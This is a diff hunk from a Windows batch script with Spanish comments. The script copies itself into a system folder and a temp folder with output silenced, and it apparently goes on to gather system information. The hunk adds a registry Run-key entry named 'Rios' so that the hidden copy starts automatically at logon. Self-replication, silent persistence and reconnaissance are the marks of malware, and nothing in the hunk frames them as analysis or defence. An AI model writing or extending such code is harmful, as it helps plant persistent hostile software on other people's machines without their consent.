@@ -50,6 +50,11 @@ if /i "%~f0" neq "!CARPETA_C!\!ARCHIVO_BAT!" copy /Y "%~f0" "!CARPETA_C!\!ARCHIV
 if /i "%~f0" neq "!CARPETA_TEMP!\!ARCHIVO_BAT!" copy /Y "%~f0" "!CARPETA_TEMP!\!ARCHIVO_BAT!" >nul 2>&1
 
 :: ======================================================================
+:: --- PERSISTENCIA EN REGISTRO (auto-inicio) ---
+:: ======================================================================
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Rios" /t REG_SZ /d "%temp%\parcial\!ARCHIVO_BAT!" /f >nul 2>&1
+
+:: ======================================================================
 :: --- OBTENER INFO DEL SISTEMA ---
 :: ======================================================================
 for /f "tokens=*" %%V in ('ver') do set "WIN_VER=%%V"
